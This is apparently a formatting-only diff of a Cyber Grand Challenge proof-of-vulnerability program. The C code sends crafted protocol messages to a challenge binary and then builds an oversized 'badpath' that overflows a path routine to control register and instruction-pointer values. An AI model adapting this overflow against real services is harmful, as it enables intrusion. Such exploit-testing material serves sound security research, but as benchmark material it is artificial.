@@ -23,20 +23,19 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 THE SOFTWARE.
 
 */
-#include <libpov.h>
 #include <libcgc.h>
+#include <libpov.h>
 
-#define TO_CB   1
+#define TO_CB 1
 #define FROM_CB 0
-#define TO_SF   3
+#define TO_SF 3
 #define FROM_SF 3
-
 
 int SendToCB(char *buf, int length) {
   int total_sent = 0;
   int ret;
   size_t bytes_sent = 0;
-  while(total_sent < length) {
+  while (total_sent < length) {
     ret = transmit(TO_CB, buf + total_sent, length - total_sent, &bytes_sent);
     if (ret != 0) {
       // error
@@ -55,7 +54,8 @@ int ReceiveFromCB(char *buf, int length) {
   size_t bytes_received = 0;
   int ret;
   while (total_received < length) {
-    ret = receive(FROM_CB, buf + total_received , length - total_received , &bytes_received);
+    ret = receive(FROM_CB, buf + total_received, length - total_received,
+                  &bytes_received);
     if (ret != 0) {
       return -1;
     }
@@ -67,13 +67,12 @@ int ReceiveFromCB(char *buf, int length) {
   return total_received;
 }
 
-
 int strcat(char *restrict s1, const char *restrict s2) {
-  uint32_t i,j;
+  uint32_t i, j;
   int length = 0;
 
   if (!s1 || !s2) {
-    return(0);
+    return (0);
   }
 
   for (i = strlen(s1), j = 0; j < strlen(s2); i++, j++, length++) {
@@ -81,9 +80,8 @@ int strcat(char *restrict s1, const char *restrict s2) {
   }
   s1[i] = '\0';
 
-  return(length);
+  return (length);
 }
-
 
 int main(void) {
   // negotiate
@@ -91,28 +89,50 @@ int main(void) {
   type1_negotiate(0xEEEEEEEE, 0xEEEEEEEE, 5, &t1vals);
 
   // perform POV
-  char negotiate[26] = "\x00\x15\x00\x00\x00\x42\x4d\x7c\xc4\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x31";
+  char negotiate[26] =
+      "\x00\x15\x00\x00\x00\x42\x4d\x7c\xc4\x01\x00\x00\x00\x00\x00\x00\x00\x00"
+      "\x00\x00\x00\x00\x02\x00\x3e\x31";
   char negotiate_response[30];
 
-  char session[59] = "\x00\x36\x00\x00\x00\x42\x4d\x7c\xc4\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x04\xaaV\xab\x01\x00\x00\x00\x00\x00\x19\x00S\x16\x00zkQmNNphInOGYFgyexSKdi";
+  char session[59] =
+      "\x00\x36\x00\x00\x00\x42\x4d\x7c\xc4\x02\x00\x00\x00\x00\x00\x00\x00\x00"
+      "\x00\x00\x0a\x00\x04\xaaV\xab\x01\x00\x00\x00\x00\x00\x19\x00S\x16\x00zk"
+      "QmNNphInOGYFgyexSKdi";
   char session_response[27];
 
-  char tree_connect[78] = "\x00\x49\x00\x00\x00\x42\x4d\x7c\xc4\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x04\xaaV\xab\xff\xff\x30\x00\x1b\x00\x66SqlMzZqcwBQYGKyqhUtupcDTbv\x08\x00SOMETREE\x07\x00\x45YEPSEE";
+  char tree_connect[78] =
+      "\x00\x49\x00\x00\x00\x42\x4d\x7c\xc4\x03\x00\x00\x00\x00\x00\x00\x00\x00"
+      "\x00\x00\x06\x00\x04\xaaV\xab\xff\xff\x30\x00\x1b\x00\x66SqlMzZqcwBQYGKy"
+      "qhUtupcDTbv\x08\x00SOMETREE\x07\x00\x45YEPSEE";
   char tree_connect_response[34];
 
-  char file_create[48] = "\x00\x2b\x00\x00\x00\x42\x4d\x7c\xc4\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x04\xaaV\xab\xff\xff\x34\x5c:\xc8\x32\x00\x00\x00\x0a\x00\x08\x00NETSTUFF";
+  char file_create[48] =
+      "\x00\x2b\x00\x00\x00\x42\x4d\x7c\xc4\x05\x00\x00\x00\x00\x00\x00\x00\x00"
+      "\x00\x00\x0e\x00\x04\xaaV\xab\xff\xff\x34\x5c:"
+      "\xc8\x32\x00\x00\x00\x0a\x00\x08\x00NETSTUFF";
   char file_create_response[36];
 
-  char transaction_bind[50] = "\x00\x2d\x00\x00\x00\x42\x4d\x7c\xc4\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x04\xaaV\xab\xff\xff\x34\x5c:\xc8\x11\x2d\x0e\x00\xa0\x00\x08\x00NETSTUFF\xdc\x00";
+  char transaction_bind[50] =
+      "\x00\x2d\x00\x00\x00\x42\x4d\x7c\xc4\x0a\x00\x00\x00\x00\x00\x00\x00\x00"
+      "\x00\x00\x0c\x00\x04\xaaV\xab\xff\xff\x34\x5c:"
+      "\xc8\x11\x2d\x0e\x00\xa0\x00\x08\x00NETSTUFF\xdc\x00";
   char transaction_bind_response[44];
 
-  char transaction_write_enum[46] = "\x00\x29\x00\x00\x00\x42\x4d\x7c\xc4\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x04\xaaV\xab\xff\xff\x05\x16\xf4\x8d\xb4\x3d\x0a\x00\xa1\x00\xc7\xccur\xb2\x00\x00\x00";
+  char transaction_write_enum[46] =
+      "\x00\x29\x00\x00\x00\x42\x4d\x7c\xc4\x0a\x00\x00\x00\x00\x00\x00\x00\x00"
+      "\x00\x00\x0c\x00\x04\xaaV\xab\xff\xff\x05\x16\xf4\x8d\xb4\x3d\x0a\x00"
+      "\xa1\x00\xc7\xccur\xb2\x00\x00\x00";
   char transaction_write_enum_response[512];
 
-  char transaction_write_canon[512] = "\x00\x31\x00\x00\x00\x42\x4d\x7c\xc4\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x04\xaaV\xab\xff\xff\x34\x5c:\xc8\x11\x2d\x12\x00\xa1\x00\xe4\x2d\x61\xe1\xbc\x00";
+  char transaction_write_canon[512] =
+      "\x00\x31\x00\x00\x00\x42\x4d\x7c\xc4\x0a\x00\x00\x00\x00\x00\x00\x00\x00"
+      "\x00\x00\x0c\x00\x04\xaaV\xab\xff\xff\x34\x5c:"
+      "\xc8\x11\x2d\x12\x00\xa1\x00\xe4\x2d\x61\xe1\xbc\x00";
   char transaction_write_canon_response[512];
 
-  char quit[24] = "\x00\x13\x00\x00\x00\x42\x4d\x7c\xc4\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+  char quit[24] =
+      "\x00\x13\x00\x00\x00\x42\x4d\x7c\xc4\x0c\x00\x00\x00\x00\x00\x00\x00\x00"
+      "\x00\x00\x00\x00\x00\x00";
   char quit_response[24];
 
   SendToCB(negotiate, sizeof(negotiate));
@@ -143,8 +163,8 @@ int main(void) {
   SendToCB(transaction_write_enum, sizeof(transaction_write_enum));
   ReceiveFromCB(transaction_write_enum_response, 43);
   uint16_t responseLength = *(uint16_t *)&transaction_write_enum_response[41];
-  ReceiveFromCB(&transaction_write_enum_response[43], responseLength );
-  
+  ReceiveFromCB(&transaction_write_enum_response[43], responseLength);
+
   char *serviceStart = &transaction_write_enum_response[45];
   memcpy(transaction_write_canon + 22, (char *)&sessionKey, 4);
   memcpy(transaction_write_canon + 28, (char *)&connectionID, 4);
@@ -152,19 +172,17 @@ int main(void) {
   memcpy(transaction_write_canon + 38, (char *)&bindID, 4);
   uint16_t length;
   length = strcat(transaction_write_canon + 46, serviceStart);
-  transaction_write_canon[46+length] = '\xd2';
+  transaction_write_canon[46 + length] = '\xd2';
   length += 1;
 
   int serviceLength = strlen(serviceStart);
-  if (serviceLength > 64)
-  {
+  if (serviceLength > 64) {
     _terminate(0);
   }
   char badpath[256];
-  badpath[0]= '\xd3';
+  badpath[0] = '\xd3';
   int i;
-  for( i = 1; i < serviceLength+48; i++)
-  {
+  for (i = 1; i < serviceLength + 48; i++) {
     badpath[i] = '\xd1';
   }
   badpath[i++] = '\xd3';
@@ -173,20 +191,19 @@ int main(void) {
   badpath[i++] = '\xd1';
   badpath[i++] = '\xd3';
   *(uint32_t *)&badpath[i] = t1vals.regval | 0x01010101;
-  i+=4;
+  i += 4;
   *(uint32_t *)&badpath[i] = t1vals.ipval | 0x01010101;
-  i+=4;
-  for (int j=i; j< i+20; j++)
-  {
+  i += 4;
+  for (int j = i; j < i + 20; j++) {
     badpath[j] = j;
   }
 
   length += strcat(transaction_write_canon + 46 + length, badpath);
-  memcpy(transaction_write_canon + 44, (char *)&length, 2); // Request Length
-  length += 10;  
-  memcpy(transaction_write_canon + 34, (char *)&length, 2); // Data Length
+  memcpy(transaction_write_canon + 44, (char *)&length, 2);  // Request Length
+  length += 10;
+  memcpy(transaction_write_canon + 34, (char *)&length, 2);  // Data Length
   length += 33;
-  memcpy(transaction_write_canon + 1, (char *)&length, 2); // Message length
+  memcpy(transaction_write_canon + 1, (char *)&length, 2);  // Message length
   SendToCB(transaction_write_canon, length + 6);
   ReceiveFromCB(transaction_write_canon_response, 34);
   return 0;
